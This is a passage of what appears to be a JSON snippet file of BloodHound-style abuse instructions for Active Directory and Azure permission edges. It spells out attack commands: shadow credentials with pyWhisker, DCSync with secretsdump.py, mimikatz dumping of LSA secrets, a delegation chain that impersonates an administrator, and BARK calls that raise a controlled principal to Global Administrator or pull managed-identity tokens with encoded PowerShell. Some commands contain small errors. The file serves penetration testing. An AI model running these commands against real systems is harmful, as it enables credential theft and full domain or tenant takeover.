        "description": "This entity has the ability to write to the \"msds-KeyCredentialLink\" property on target object. Writing to this property allows an attacker to create \"Shadow Credentials\" on the object and authenticate as the principal using kerberos PKINIT.",
        "prefix": "AddKeyCredentialLink",
        "body": [
            "This entity has the ability to write to the \"msds-KeyCredentialLink\" property on $TARGET. Writing to this property allows an attacker to create \"Shadow Credentials\" on the object and authenticate as the principal using kerberos PKINIT.",
            "To Abuse 'AddKeyCredentialLink' on linux: ",
            "To abuse this permission, use [pyWhisker](https://github.com/ShutdownRepo/pywhisker).",
            "```sh",
            "pywhisker.py -d \"domain.local\" -u \"controlledAccount\" -p \"somepassword\" --target \"targetAccount\" --action \"add\"",
            "```",
            "For other optional parameters, view the pyWhisker documentation."
        ]
    },
    "DCSync linux abuse (bloodhound)": {
        "description": "This entity has the DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All permission on the domain target object.These two permissions allow a principal to perform a DCSync attack.",
        "prefix": "DCSync",
        "body": [
            "This entity has the DS-Replication-Get-Changes and the DS-Replication-Get-Changes-All permission on the domain $TARGET.These two permissions allow a principal to perform a DCSync attack.",
            "To Abuse 'DCSync' on linux: ",
            "You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:",
            "```sh",
            "secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'",
            "```",
            "You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab."
        ]
    },
    "SyncLAPSPassword common abuse (bloodhound)": {
        "description": "This entity has the ability to synchronize the password set by Local Administrator Password Solution (LAPS) on the computer target object.The local administrator password for a computer managed by LAPS is stored in the confidential and Read-Only Domain Controller (RODC) filtered LDAP attribute \n```sh\nms-mcs-AdmPwd\n```.",
        "prefix": "SyncLAPSPassword",
        "body": [
            "This entity has the ability to synchronize the password set by Local Administrator Password Solution (LAPS) on the computer $TARGET.The local administrator password for a computer managed by LAPS is stored in the confidential and Read-Only Domain Controller (RODC) filtered LDAP attribute \n```sh\nms-mcs-AdmPwd\n```.",
            "To Abuse 'SyncLAPSPassword' commonly: ",
            "To abuse this privilege with DirSync, first import DirSync into your agent session or into a PowerShell instance at the console. You must authenticate to the Domain Controller as This entity has. Then, execute the",
            "```sh",
            "Sync-LAPS",
            "``` function:",
            "```sh",
            "['Sync-LAPS -LDAPFilter \"(samaccountname=', '$$TARGET', ')\"']",
            "```",
            "You can target a specific domain controller using the",
            "```sh",
            "-Server",
            "``` parameter."
        ]
    },
    "WriteAccountRestrictions linux abuse (bloodhound)": {
        "description": "This entity has has write rights on all properties in the User Account Restrictions property set. Having write access to this property set translates to the ability to modify several attributes on computer target object, among which the msDS-AllowedToActOnBehalfOfOtherIdentity attribute is the most interesting. The other attributes in this set are listed in Dirk-jan's blog on this topic (see references).The ability to modify the msDS-AllowedToActOnBehalfOfOtherIdentity property allows an attacker to abuse resource-based constrained delegation to compromise the remote computer system. This property is a binary DACL that controls what security principals can pretend to be any domain user to the particular computer object.If the msDS-AllowedToActOnBehalfOfOtherIdentity DACL is set to allow an attack-controller account, the attacker can use said account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket \"as\" this user.One caveat is that impersonated users can not be in the \"Protected Users\" security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service principal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.",
        "prefix": "WriteAccountRestrictions",
        "body": [
            "This entity has has write rights on all properties in the User Account Restrictions property set. Having write access to this property set translates to the ability to modify several attributes on computer $TARGET, among which the msDS-AllowedToActOnBehalfOfOtherIdentity attribute is the most interesting. The other attributes in this set are listed in Dirk-jan's blog on this topic (see references).The ability to modify the msDS-AllowedToActOnBehalfOfOtherIdentity property allows an attacker to abuse resource-based constrained delegation to compromise the remote computer system. This property is a binary DACL that controls what security principals can pretend to be any domain user to the particular computer object.If the msDS-AllowedToActOnBehalfOfOtherIdentity DACL is set to allow an attack-controller account, the attacker can use said account to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket \"as\" this user.One caveat is that impersonated users can not be in the \"Protected Users\" security group or otherwise have delegation privileges revoked. Another caveat is that the principal added to the msDS-AllowedToActOnBehalfOfOtherIdentity DACL *must* have a service principal name (SPN) set in order to successfully abuse the S4U2self/S4U2proxy process. If an attacker does not currently control an account with a SPN set, an attacker can abuse the default domain MachineAccountQuota settings to add a computer account that the attacker controls via the Powermad project.",
            "To Abuse 'WriteAccountRestrictions' on linux: ",
            "First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:",
            "```sh",
            "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$$' -computer-pass 'Summer2018!' -dc-host $$DomainController -domain-netbios $$DOMAIN 'domain/user:password'",
            "```",
            "We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:",
            "```sh",
            "rbcd.py -delegate-from 'ATTACKERSYSTEM$$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'",
            "```",
            "And finally we can get a service ticket for the service name (sname) we want to \"pretend\" to be \"admin\" for. Impacket's getST.py example script can be used for that purpose.",
            "```sh",
            "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$$:Summer2018!'",
            "```",
            "This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."
        ]
    },
    "WriteGPLink linux abuse (bloodhound)": {
        "description": "This entity has has the permissions to modify the gPLink attribute of  target object.The ability to alter the gPLink attribute may allow an attacker to apply a malicious Group Policy Object (GPO) to all child user and computer objects (including the ones located in nested OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them.Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup.Alternatively, the ability to modify the gPLink attribute can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands.",
        "prefix": "WriteGPLink",
        "body": [
            "This entity has has the permissions to modify the gPLink attribute of  $TARGET.The ability to alter the gPLink attribute may allow an attacker to apply a malicious Group Policy Object (GPO) to all child user and computer objects (including the ones located in nested OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them.Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup.Alternatively, the ability to modify the gPLink attribute can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands.",
            "To Abuse 'WriteGPLink' on linux: ",
            "From a Linux machine, the WriteGPLink permission may be abused using the [OUned.py](https://github.com/synacktiv/OUned) exploitation tool. For a detailed outline of exploit requirements and implementation, you can refer to [the article associated to the OUned.py tool](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory).",
            "Be mindful of the number of users and computers that are in the given domain as they all will attempt to fetch and apply the malicious GPO."
        ]
    },
    "DumpSMSAPassword common abuse (bloodhound)": {
        "description": "This entity has the Standalone Managed Service Account (sMSA) target object installed on it.With administrative privileges on controlled object, it is possible to dump target object's password stored in LSA secrets.",
        "prefix": "DumpSMSAPassword",
        "body": [
            "This entity has the Standalone Managed Service Account (sMSA) $TARGET installed on it.With administrative privileges on $CONTROLLED, it is possible to dump $TARGET's password stored in LSA secrets.",
            "To Abuse 'DumpSMSAPassword' commonly: ",
            "From an elevated command prompt on $$CONTROLLED, run mimikatz then execute the following commands:",
            "```sh",
            "privilege::debug",
            "token::elevate",
            "lsadump::secrets",
            "```",
            "In the output, find",
            "```sh",
            "['_SC_{262E99C9-6160-4871-ACEC-4E61736B6F21}_', '$$target']",
            "```. The next line contains",
            "```sh",
            "cur/hex :",
            "``` followed with $$TARGET's password hex-encoded.",
            "To use this password, its NT hash must be calculated. This can be done using a small python script:",
            "```sh",
            "# nt.py",
            "import sys, hashlib",
            "pw_hex = sys.argv[1]",
            "nt_hash = hashlib.new('md4', bytes.fromhex(pw_hex)).hexdigest()",
            "print(nt_hash)",
            "```",
            "Execute it like so:",
            "```sh",
            "python3 nt.py 35f3e1713d61...",
            "```",
            "To authenticate as the sMSA, leverage pass-the-hash.",
            "Alternatively, to avoid executing mimikatz on $$CONTROLLED, you can save a copy of the",
            "```sh",
            "SYSTEM",
            "``` and",
            "```sh",
            "SECURITY",
            "``` registry hives from an elevated prompt:",
            "```sh",
            "reg save HKLM\\SYSTEM %temp%\\SYSTEM & reg save HKLM\\SECURITY %temp%\\SECURITY",
            "```",
            "Transfer the files named",
            "```sh",
            "SYSTEM",
            "``` and",
            "```sh",
            "SECURITY",
            "``` that were saved at",
            "```sh",
            "%temp%",
            "``` to another computer where mimikatz can be safely executed. On this other computer, run mimikatz from a command prompt then execute the following command to obtain the hex-encoded password:",
            "```sh",
            "lsadump::secrets /system:C:\\path\\to\\file\\SYSTEM /security:C:\\path\\to\\file\\SECURITY",
            "```"
        ]
    },
    "AZMGAddMember common abuse (bloodhound)": {
        "description": "This edge is created during post-processing. It is created against non role assignable Azure AD security groups when a Service Principal has one of the following MS Graph app role assignments:Directory.ReadWrite.AllGroup.ReadWrite.AllGroupMember.ReadWrite.AllIt is created against all Azure AD security groups, including those that are role assignable, when a Service Principal has the following MS Graph app role:RoleManagement.ReadWrite.DirectoryYou will not see this privilege when using just the Azure portal or any other Microsoft tooling. If you audit the roles and administrators affecting any particular Azure security group, you will not see that the Service Principal can add members to the group, but it indeed can because of the parallel access management system used by MS Graph.",
        "prefix": "AZMGAddMember",
        "body": [
            "This edge is created during post-processing. It is created against non role assignable Azure AD security groups when a Service Principal has one of the following MS Graph app role assignments:Directory.ReadWrite.AllGroup.ReadWrite.AllGroupMember.ReadWrite.AllIt is created against all Azure AD security groups, including those that are role assignable, when a Service Principal has the following MS Graph app role:RoleManagement.ReadWrite.DirectoryYou will not see this privilege when using just the Azure portal or any other Microsoft tooling. If you audit the roles and administrators affecting any particular Azure security group, you will not see that the Service Principal can add members to the group, but it indeed can because of the parallel access management system used by MS Graph.",
            "To Abuse 'AZMGAddMember' commonly: ",
            "You can abuse this privilege using BARK's Add-AZMemberToGroup function.",
            "This function requires you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to add principal to the target group. There are several ways to acquire a JWT. For example, you may use BARK\u2019s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:",
            "```sh",
            "$$MGToken = Get-MSGraphTokenWithClientCredentials `",
            "-ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" `",
            "-ClientSecret \"asdf...\" `",
            "-TenantName \"contoso.onmicrosoft.com\"",
            "```",
            "Then use BARK\u2019s Add-AZMemberToGroup function to add a new principial to the target group:",
            "```sh",
            "Add-AZMemberToGroup `",
            "-PrincipalID = \"028362ca-90ae-41f2-ae9f-1a678cc17391\" `",
            "-TargetGroupId \"b9801b7a-fcec-44e2-a21b-86cb7ec718e4\" `",
            "-Token $$MGToken.access_token",
            "```",
            "Now you can re-authenticate as the principial you just added to the group and continue your attack path, now having whatever privileges the target group has."
        ]
    },
    "AZMGAddOwner common abuse (bloodhound)": {
        "description": "This edge is created during post-processing. It is created against all App Registrations and Service Principals within the same tenant when a Service Principal has the following MS Graph app role:Application.ReadWrite.AllIt is also created against all Azure Service Principals when a Service Principal has the following MS Graph app role:ServicePrincipalEndpoint.ReadWrite.AllIt is also created against all Azure security groups that are not role eligible when a Service Principal has one of the following MS Graph app roles:Directory.ReadWrite.AllGroup.ReadWrite.AllFinally, it is created against all Azure security groups and all Azure App Registrations when a Service Principal has the following MS Graph app role:RoleManagement.ReadWrite.DirectoryYou will not see these privileges when auditing permissions against any of the mentioned objects when you use Microsoft tooling, including the Azure portal and the MS Graph API itself.",
        "prefix": "AZMGAddOwner",
        "body": [
            "This edge is created during post-processing. It is created against all App Registrations and Service Principals within the same tenant when a Service Principal has the following MS Graph app role:Application.ReadWrite.AllIt is also created against all Azure Service Principals when a Service Principal has the following MS Graph app role:ServicePrincipalEndpoint.ReadWrite.AllIt is also created against all Azure security groups that are not role eligible when a Service Principal has one of the following MS Graph app roles:Directory.ReadWrite.AllGroup.ReadWrite.AllFinally, it is created against all Azure security groups and all Azure App Registrations when a Service Principal has the following MS Graph app role:RoleManagement.ReadWrite.DirectoryYou will not see these privileges when auditing permissions against any of the mentioned objects when you use Microsoft tooling, including the Azure portal and the MS Graph API itself.",
            "To Abuse 'AZMGAddOwner' commonly: ",
            "You can use BARK to add a new owner to the target object. The BARK function you use will depend on the target object type, but all of the functions follow a similar syntax.",
            "These functions require you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to add a new owner to the target object. There are several ways to acquire a JWT. For example, you may use BARK\u2019s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:",
            "```sh",
            "$$MGToken = Get-MSGraphTokenWithClientCredentials `",
            "-ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" `",
            "-ClientSecret \"asdf...\" `",
            "-TenantName \"contoso.onmicrosoft.com\"",
            "```",
            "To add a new owner to a Service Principal, use BARK's New-ServicePrincipalOwner function:",
            "```sh",
            "New-ServicePrincipalOwner `",
            "-ServicePrincipalObjectId \"082cf9b3-24e2-427b-bcde-88ffdccb5fad\" `",
            "-NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" `",
            "-Token $$Token",
            "```",
            "To add a new owner to an App Registration, use BARK's New-AppOwner function:",
            "```sh",
            "New-AppOwner `",
            "-AppObjectId \"52114a0d-fa5b-4ee5-9a29-2ba048d46eee\" `",
            "-NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" `",
            "-Token $$Token",
            "```",
            "To add a new owner to a Group, use BARK's New-GroupOwner function:",
            "```sh",
            "New-AppOwner `",
            "-GroupObjectId \"352032bf-161d-4788-b77c-b6f935339770\" `",
            "-NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" `",
            "-Token $$Token",
            "```"
        ]
    },
    "AZMGAddSecret common abuse (bloodhound)": {
        "description": "This edge is created during post-processing. It is created against all Azure App Registrations and Service Principals when a Service Principal has one of the following MS Graph app roles:Application.ReadWrite.AllRoleManagement.ReadWrite.DirectoryYou will not see this privilege when using just the Azure portal or any other Microsoft tooling. If you audit the roles and administrators affecting any particular Azure App or Service Principal, you will not see that the Service Principal can add secrets to the object, but it indeed can because of the parallel access management system used by MS Graph.",
        "prefix": "AZMGAddSecret",
        "body": [
            "This edge is created during post-processing. It is created against all Azure App Registrations and Service Principals when a Service Principal has one of the following MS Graph app roles:Application.ReadWrite.AllRoleManagement.ReadWrite.DirectoryYou will not see this privilege when using just the Azure portal or any other Microsoft tooling. If you audit the roles and administrators affecting any particular Azure App or Service Principal, you will not see that the Service Principal can add secrets to the object, but it indeed can because of the parallel access management system used by MS Graph.",
            "To Abuse 'AZMGAddSecret' commonly: ",
            "There are several ways to perform this abuse, depending on what sort of access you have to the credentials of the object that holds this privilege against the target object. If you have an interactive web browser session for the Azure portal, it is as simple as finding the target App in the portal and adding a new secret to the object using the \u201cCertificates & secrets\u201d tab. Service Principals do not have this tab in the Azure portal but you can add secrets to them with the MS Graph API.",
            "No matter what kind of control you have, you will be able to perform this abuse by using BARK\u2019s New-AppRegSecret or New-ServicePrincipalSecret functions.",
            "These functions require you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to add secrets to the target object. There are several ways to acquire a JWT. For example, you may use BARK\u2019s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:",
            "```sh",
            "$$MGToken = Get-MSGraphTokenWithClientCredentials",
            "-ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\"",
            "-ClientSecret \"asdf...\"",
            "-TenantName \"contoso.onmicrosoft.com\"",
            "```",
            "Then use BARK\u2019s New-AppRegSecret to add a new secret to the target application:",
            "```sh",
            "New-AppRegSecret `",
            "-AppRegObjectID \"d878\u2026\" `",
            "-Token $$MGToken.access_token",
            "```",
            "The output will contain the plain-text secret you just created for the target app:",
            "```sh",
            "New-AppRegSecret `",
            "-AppRegObjectID \"d878\u2026\" `",
            "-Token $$MGToken.access_token",
            "Name                Value",
            "-----------------------------",
            "AppRegSecretValue   odg8Q~...",
            "AppRegAppId         4d31\u2026",
            "AppRegObjectId      d878\u2026",
            "```",
            "With this plain text secret, you can now acquire tokens as the service principal associated with the app. You can easily do this with BARK\u2019s Get-MSGraphToken function:",
            "```sh",
            "$$SPToken = Get-MSGraphToken `",
            "-ClientID \"4d31\u2026\" `",
            "-ClientSecret \"odg8Q~...\" `",
            "-TenantName \"contoso.onmicrosoft.com\"",
            "```",
            "Now you can use this JWT to perform actions against any other MS Graph endpoint as the service principal, continuing your attack path with the privileges of that service principal."
        ]
    },
    "AZMGGrantAppRoles common abuse (bloodhound)": {
        "description": "This edge is created during post-processing. It is created against AzureAD tenant objects when a Service Principal has one of the following MS Graph app role assignments:AppRoleAssignment.ReadWrite.AllRoleManagement.ReadWrite.Directory",
        "prefix": "AZMGGrantAppRoles",
        "body": [
            "This edge is created during post-processing. It is created against AzureAD tenant objects when a Service Principal has one of the following MS Graph app role assignments:AppRoleAssignment.ReadWrite.AllRoleManagement.ReadWrite.Directory",
            "To Abuse 'AZMGGrantAppRoles' commonly: ",
            "With the ability to grant arbitrary app roles, you can grant the RoleManagement.ReadWrite.Directory app role to a Service Principal you already control, and then promote it or another principal to Global Administrator.",
            "These functions require you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to grant app roles. There are several ways to acquire a JWT. For example, you may use BARK\u2019s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:",
            "```sh",
            "$$MGToken = Get-MSGraphTokenWithClientCredentials `",
            "-ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" `",
            "-ClientSecret \"asdf...\" `",
            "-TenantName \"contoso.onmicrosoft.com\"",
            "```",
            "Use BARK's Get-AllAzureADServicePrincipals to collect all Service Principal objects in the tenant:",
            "```sh",
            "\"$$SPs = Get-AllAzureADServicePrincipals `",
            "-Token $$MGToken\"",
            "```",
            "Next, find the MS Graph Service Principal's ID. You can do this by piping $$SPs to Where-Object, finding objects where the appId value matches the universal ID for the MS Graph Service Principal, which is 00000003-0000-0000-c000-000000000000:",
            "```sh",
            "$$SPs | ?{$$_.appId -Like \"00000003-0000-0000-c000-000000000000\"} | Select id",
            "```",
            "The output will be the object ID of the MS Graph Service Principal. Take that ID and use it as the \"ResourceID\" argument for BARK's New-AppRoleAssignment function. The AppRoleID of '9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8' is the universal ID for RoleManagement.ReadWrite.Directory. The SPObjectId is the object ID of the Service Principal you want to grant this app role to:",
            "```sh",
            "'New-AppRoleAssignment `",
            "-SPObjectId \"6b6f9289-fe92-4930-a331-9575e0a4c1d8\" `",
            "-AppRoleID \"9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8\" `",
            "-ResourceID \"9858020a-4c00-4399-9ae4-e7897a8333fa\" `",
            "-Token $$MGToken'",
            "```",
            "If successful, the output of this command will show you the App Role assignment ID. Now that your Service Principal has the RoleManagement.ReadWrite.Directory MS Graph app role, you can promote the Service Principal to Global Administrator using BARK's New-AzureADRoleAssignment.",
            "```sh",
            "New-AzureADRoleAssignment `",
            "-PrincipalID \"6b6f9289-fe92-4930-a331-9575e0a4c1d8\" `",
            "-RoleDefinitionId \"62e90394-69f5-4237-9190-012177145e10\" `",
            "-Token $$MGToken",
            "```",
            "If successful, the output will include the principal ID, the role ID, and a unique ID for the role assignment."
        ]
    },
    "AZMGGrantRole common abuse (bloodhound)": {
        "description": "This edge is created during post-processing. It is created against all AzureAD admin roles when a Service Principal has the following MS Graph app role assignment:RoleManagement.ReadWrite.DirectoryThis privilege allows the Service Principal to promote itself or any other principal to any AzureAD admin role, including Global Administrator.",
        "prefix": "AZMGGrantRole",
        "body": [
            "This edge is created during post-processing. It is created against all AzureAD admin roles when a Service Principal has the following MS Graph app role assignment:RoleManagement.ReadWrite.DirectoryThis privilege allows the Service Principal to promote itself or any other principal to any AzureAD admin role, including Global Administrator.",
            "To Abuse 'AZMGGrantRole' commonly: ",
            "To abuse this privilege, you can promote a principal you control to Global Administrator using BARK's New-AzureADRoleAssignment.",
            "This function requires you to supply an MS Graph-scoped JWT associated with the Service Principal that has the privilege to grant AzureAD admin roles. There are several ways to acquire a JWT. For example, you may use BARK\u2019s Get-MSGraphTokenWithClientCredentials to acquire an MS Graph-scoped JWT by supplying a Service Principal Client ID and secret:",
            "```sh",
            "$$MGToken = Get-MSGraphTokenWithClientCredentials `",
            "-ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" `",
            "-ClientSecret \"asdf...\" `",
            "-TenantName \"contoso.onmicrosoft.com\"",
            "```",
            "Then use BARK's New-AzureADRoleAssignment function to grant the AzureAD role to your target principal:",
            "```sh",
            "New-AzureADRoleAssignment `",
            "-PrincipalID \"6b6f9289-fe92-4930-a331-9575e0a4c1d8\" `",
            "-RoleDefinitionId \"62e90394-69f5-4237-9190-012177145e10\" `",
            "-Token $$MGToken",
            "```",
            "If successful, the output will include the principal ID, the role ID, and a unique ID for the role assignment."
        ]
    },
    "AZMGAppRoleAssignment_ReadWrite_All common abuse (bloodhound)": {
        "description": "This edge is created when a Service Principal has been granted the AppRoleAssignment.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges.",
        "prefix": "AZMGAppRoleAssignment_ReadWrite_All",
        "body": [
            "This edge is created when a Service Principal has been granted the AppRoleAssignment.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges.",
            "To Abuse 'AZMGAppRoleAssignment_ReadWrite_All' commonly: ",
            "This edge is created when a Service Principal has been granted the AppRoleAssignment.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."
        ]
    },
    "AZMGApplication_ReadWrite_All common abuse (bloodhound)": {
        "description": "This edge is created when a Service Principal has been granted the Application.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges.",
        "prefix": "AZMGApplication_ReadWrite_All",
        "body": [
            "This edge is created when a Service Principal has been granted the Application.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges.",
            "To Abuse 'AZMGApplication_ReadWrite_All' commonly: ",
            "This edge is created when a Service Principal has been granted the Application.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."
        ]
    },
    "AZMGDirectory_ReadWrite_All common abuse (bloodhound)": {
        "description": "This edge is created when a Service Principal has been granted the Directory.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges.",
        "prefix": "AZMGDirectory_ReadWrite_All",
        "body": [
            "This edge is created when a Service Principal has been granted the Directory.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges.",
            "To Abuse 'AZMGDirectory_ReadWrite_All' commonly: ",
            "This edge is created when a Service Principal has been granted the Directory.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."
        ]
    },
    "AZMGGroupMember_ReadWrite_All common abuse (bloodhound)": {
        "description": "This edge is created when a Service Principal has been granted the GroupMember.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges.",
        "prefix": "AZMGGroupMember_ReadWrite_All",
        "body": [
            "This edge is created when a Service Principal has been granted the GroupMember.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges.",
            "To Abuse 'AZMGGroupMember_ReadWrite_All' commonly: ",
            "This edge is created when a Service Principal has been granted the GroupMember.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."
        ]
    },
    "AZMGGroup_ReadWrite_All common abuse (bloodhound)": {
        "description": "This edge is created when a Service Principal has been granted the Group.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges.",
        "prefix": "AZMGGroup_ReadWrite_All",
        "body": [
            "This edge is created when a Service Principal has been granted the Group.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges.",
            "To Abuse 'AZMGGroup_ReadWrite_All' commonly: ",
            "This edge is created when a Service Principal has been granted the Group.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."
        ]
    },
    "AZMGRoleManagement_ReadWrite_Directory common abuse (bloodhound)": {
        "description": "This edge is created when a Service Principal has been granted the RoleManagement.ReadWrite.Directory edge. The edge is not abusable, but is used during post-processing to create abusable edges.",
        "prefix": "AZMGRoleManagement_ReadWrite_Directory",
        "body": [
            "This edge is created when a Service Principal has been granted the RoleManagement.ReadWrite.Directory edge. The edge is not abusable, but is used during post-processing to create abusable edges.",
            "To Abuse 'AZMGRoleManagement_ReadWrite_Directory' commonly: ",
            "This edge is created when a Service Principal has been granted the RoleManagement.ReadWrite.Directory edge. The edge is not abusable, but is used during post-processing to create abusable edges."
        ]
    },
    "AZMGServicePrincipalEndpoint_ReadWrite_All common abuse (bloodhound)": {
        "description": "This edge is created when a Service Principal has been granted the ServicePrincipalEndpoint.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges.",
        "prefix": "AZMGServicePrincipalEndpoint_ReadWrite_All",
        "body": [
            "This edge is created when a Service Principal has been granted the ServicePrincipalEndpoint.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges.",
            "To Abuse 'AZMGServicePrincipalEndpoint_ReadWrite_All' commonly: ",
            "This edge is created when a Service Principal has been granted the ServicePrincipalEndpoint.ReadWrite.All edge. The edge is not abusable, but is used during post-processing to create abusable edges."
        ]
    },
    "AZWebsiteContributor common abuse (bloodhound)": {
        "description": "The Website Contributor role grants full control of the target Function App or Web App. Full control of either of those types of resources allows for arbitrary command execution against the target resoruce.",
        "prefix": "AZWebsiteContributor",
        "body": [
            "The Website Contributor role grants full control of the target Function App or Web App. Full control of either of those types of resources allows for arbitrary command execution against the target resoruce.",
            "To Abuse 'AZWebsiteContributor' commonly: ",
            "You can use BARK's Invoke-AzureRMWebAppShellCommand function to execute commands on a target Web App. You can use BARK's New-PowerShellFunctionAppFunction, Get-AzureFunctionAppMasterKeys, and Get-AzureFunctionOutput functions to execute arbitrary commands against a target Function App.",
            "These functions require you to supply an Azure Resource Manager scoped JWT associated with the principal that has the privilege to execute commands on the web app or function app. There are several ways to acquire a JWT. For example, you may use BARK's Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT by supplying a refresh token:",
            "```sh",
            "$$ARMToken = Get-ARMTokenWithRefreshToken `",
            "-RefreshToken \"0.ARwA6WgJJ9X2qk\u2026\" `",
            "-TenantID \"contoso.onmicrosoft.com\"",
            "```",
            "Now you can use BARK's Invoke-AzureRMWebAppShellCommand function to execute a command against the target Web App. For example, to run a simple \"whoami\" command:",
            "```sh",
            "Invoke-AzureRMWebAppShellCommand `",
            "-KuduURI \"https://mycoolwindowswebapp.scm.azurewebsites.net/api/command\" `",
            "-Token $$ARMToken `",
            "-Command \"whoami\"",
            "```",
            "If the Web App has a managed identity assignments, you can use BARK's Invoke-AzureRMWebAppShellCommand function to retrieve a JWT for the managed identity Service Principal like this:",
            "```sh",
            "PS C:> $$PowerShellCommand =",
            "$$headers=@{\"X-IDENTITY-HEADER\"=$$env:IDENTITY_HEADER}",
            "$$response = Invoke-WebRequest -UseBasicParsing -Uri \"$$($$env:IDENTITY_ENDPOINT)?resource=https://storage.azure.com/&api-version=2019-08-01\" -Headers $$headers",
            "$$response.RawContent",
            "PS C:> $$base64Cmd = [System.Convert]::ToBase64String(",
            "[System.Text.Encoding]::Unicode.GetBytes(",
            "$$PowerShellCommand",
            ")",
            ")",
            "PS C:> $$Command = \"powershell -enc $$($$base64Cmd)\"",
            "PS C:> Invoke-AzureRMWebAppShellCommand `",
            "-KuduURI \"https://mycoolwindowswebapp.scm.azurewebsites.net/api/command\" `",
            "-token $$ARMToken `",
            "-Command $$Command",
            "```",
            "If successful, the output will include a JWT for the managed identity service principal."
        ]
    },
    "AZAddOwner common abuse (bloodhound)": {
        "description": "This edge is created during post-processing. It is created against all App Registrations and Service Principals within the same tenant when an Azure principal has one of the following Azure Active Directory roles:Hybrid Identity AdministratorPartner Tier1 SupportPartner Tier2 SupportDirectory Synchronization AccountsYou will not see these privileges when auditing permissions against any of the mentioned objects when you use Microsoft tooling, including the Azure portal or any API.",
        "prefix": "AZAddOwner",
        "body": [
            "This edge is created during post-processing. It is created against all App Registrations and Service Principals within the same tenant when an Azure principal has one of the following Azure Active Directory roles:Hybrid Identity AdministratorPartner Tier1 SupportPartner Tier2 SupportDirectory Synchronization AccountsYou will not see these privileges when auditing permissions against any of the mentioned objects when you use Microsoft tooling, including the Azure portal or any API.",
            "To Abuse 'AZAddOwner' commonly: ",
            "You can use BARK to add a new owner to the target object. The BARK function you use will depend on the target object type, but all of the functions follow a similar syntax.",
            "These functions require you to supply an MS Graph-scoped JWT associated with the principal that has the privilege to add a new owner to your target object. There are several ways to acquire a JWT. For example, you may use BARK\u2019s Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT by supplying a refresh token:",
            "```sh",
